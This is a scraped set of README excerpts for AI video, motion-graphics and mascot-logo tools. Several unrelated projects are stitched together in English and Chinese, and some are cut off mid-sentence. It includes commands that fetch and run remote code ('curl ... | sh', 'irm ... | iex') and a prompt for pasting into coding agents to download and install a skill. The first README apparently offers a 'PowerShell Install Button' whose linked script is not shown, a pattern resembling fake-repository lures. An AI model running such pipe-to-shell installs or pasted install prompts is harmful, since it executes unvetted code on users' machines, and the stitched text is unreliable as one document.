itens.descricao_en: Eyeline teleprompter meets editing agents: JSON-driven animation and motion graphics workflow
itens.readme:
# 🎬 AI Video Editing System — Video Tool
### 📦 PowerShell Install Button
[ ](https://dhruvthakur11.github.io/youtube-ai-video-editing-system/)
[ ]() [ ]() [ ]() [ ]()
---
This system treats a video as a visual conversation between script and screen: an Eyeline teleprompter follows your voice as you record, then hands the takes to editing agents that propose cuts in plain Markdown and JSON you can read, argue with, and revise by hand. From there, approved transcripts flow into design boards and Claude Design prompts, where layout, typography, and motion are shaped frame by frame. Animation and motion graphics are driven by JSON timelines so every reveal, mask, and transition stays aligned to the narration rather than guessed at in the edit bay. The whole pipeline lands in a predictable folder tree, ready for a finishing editor to pick up—built to be customized, not followed blindly.
## 🔧 Requirements
- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required
## Features
**Eyeline teleprompter.** Read your script on screen, follow it with your voice, and record the microphone feed in real time. Flag flubbed lines without breaking flow, tag multiple attempts for the same section, and optionally mirror the display to a second screen over your local network so you can read from wherever the camera points. Every take lands in a tidy folder with its audio, script

raea 
  Render Anything Engine   (for Anyone)  
  Tell your AI what to make. Videos, motion graphics, 3D and games, written as React and TypeScript 
  (the code your AI already writes) and rendered on your own GPU, faster than they play.
   raea.io  ·

   Why raea  ·
   Docs  ·
   Releases 
---
> **Canary.** raea changes daily. Releases run on macOS (Apple Silicon), Linux (x86_64) and, new and least tested,
> Windows (x86_64). Expect breaking changes, rough edges and gaps in the docs.
## Install
```sh
curl -fsSL https://raea.io/install | sh
```
The installer puts the `raea` command under `~/.raea`, links it into `~/.local/bin`, and adds raea's agent skills to
`~/.claude/skills`, so Claude Code (or any agent that reads that folder) knows how to write, render and check raea
work. Run it again to update. The engine is free and needs no account. Tarballs and checksums are on the
[releases page](https://github.com/shinyobjectz/raea/releases).
On Windows 10 or 11, in PowerShell:
```powershell
irm https://raea.io/install.ps1 | iex
```
It does the same under `~\.raea` and adds raea to your PATH. raea needs the Microsoft Visual C++ Redistributable
(x64), which most machines already have, and a DirectX 12 or Vulkan GPU driver.

itens.descricao_en: A compact Agent Skill for highly simplified, rounded, subtly neo-skeuomorphic IP mascot logos.
itens.readme:
# IP as Logo
`ip-as-logo` is a compact Agent Skill for generating extremely simple, cute, company-ready IP mascots. It prioritizes lovable character appeal, bold rounded silhouettes, strict complexity limits, a dominant lower-left composition, and a solid named background color.
It follows the open Agent Skills format and is designed to work with any compatible AI agent, rather than being tied to a specific agent product.
You can also browse the free [IP as Logo Skill website](https://visualskills.dev/ip-as-logo), a searchable library backed by Cloudflare R2 and Supabase.
**Don't have Codex, Doubao, Coze, or Workbuddy?** [Visit our website](https://visualskills.dev/ip-as-logo) to download ready-made logos for free. Every logo is free for commercial use.
## What it guides
- One dominant silhouette built from roughly 4–7 large basic shapes
- Three semantic colors by default: two IP base colors plus one background color
- Three proposed directions followed by six independently generated candidates after user approval
- Familiar, broadly appealing animals as the default open-ended subject; objects, machines, fantasy artifacts, and obscure creatures require a clear product reason
- Context-aware, clearly separated subject colors and gently muted, slightly lower-saturation backgrounds with barely-there neo-skeuomorphic depth, described without percentages or prescribed gradient and shading formulas
- Thick, rounded forms without sharp or fragile details
- A large, visually dominant

## 先看风格
粒子、霓虹、水墨、剪纸、漫画、电影感……把喜欢的画面交给 AI，再用代码把它动起来。
以上图片来自素材包自带的参考静帧，编号与提示词一一对应。**196 种有图，145 种为文字参考**；静帧展示视觉方向，实际动画取决于内容、实现和渲染结果。
| 想做什么 | 可以从这里开始 |
|---|---|
| 温暖的粒子叙事／片头 | **B3** 粒子聚形、**B2** 萤火光尘 |
| 国风片头／节日短片 | **Z5** 剪纸、**Z1** 水墨、**Z8** 敦煌 |
| 科技感／赛博城市 | **R1** 霓虹雨夜、**R5** 像素赛博、**R6** 东方赛博 |
| 科普／知识讲解 | **M1** 白板手绘讲解、**L10** 工程方案比较墙 |
| 漫画短片／有冲击力的表达 | **R3** 美式漫画、**X7** 英雄漫画 |
| 杂志式排版／电影视觉参考 | **H1** Biennale Yellow、**O** 系列 |
## 它包含什么
| 组成 | 你可以用它做什么 |
|---|---|
| **素材库与社区补充** | 阅读 341 份 Markdown 提示词，查看静帧、参考实现与原始示例 |
| **离线风格挑选器** | 搜索、按类别筛选、放大图片、勾选风格、导出已选清单 |
| **可安装 Agent Skill** | 让 Claude Code／Codex 按需读取风格，规划镜头并制作代码动画 |
| **轻量检索脚本** | 按编号、关键词、系列查找；不必把整个素材库塞进上下文 |
| **浏览器渲染工具** | 将提供时间接口的 HTML 逐帧导出为 MP4，可混入已有音频 |
| **一键导入提示词** | 复制到有本地文件和终端权限的 Claude Code／Codex，完成下载与安装 |
## 一键导入：Claude Code / Codex
**复制下面整段，粘贴给 Claude Code 或 Codex：**
```text
请将 https://github.com/XiaoyeCodes/code-animation-prompts 安装为当前编程助手可用的 skill。
1. 将仓库下载到合适的本地目录；若已有同名目录，先检查内容，不覆盖已有改动。
2. 阅读 README.md、docs/INSTALL.md 和 skills/code-animation-prompts/SKILL.md。
3. 根据当前助手选择安装目标：Codex 使用 ~/.agents/skills/code-animation-pr

# anything2explainer

**English** | [简体中文](README_ZH.md)
**Topic in, narrated explainer video out.** anything2explainer is a [Claude Code](https://claude.com/claude-code) / [Codex](https://openai.com/codex) skill that turns any topic into a black-canvas motion-graphics explainer video with TTS voiceover, subtitles and a chapter progress bar, in Chinese or English. Every frame is drawn in code with [Remotion](https://remotion.dev) (React + TypeScript). No stock footage, no generative video model, no frames lifted from anyone else's work.
It is not a CLI. What ships here is the whole method an AI coding agent needs to finish the film: a compilable Remotion template, a primitives and lighting library, tooling for voiceover / storyboard / rendering / quantitative QC, written style and motion specs, a multi-agent division-of-labour protocol, and one complete reference film as the quality bar.
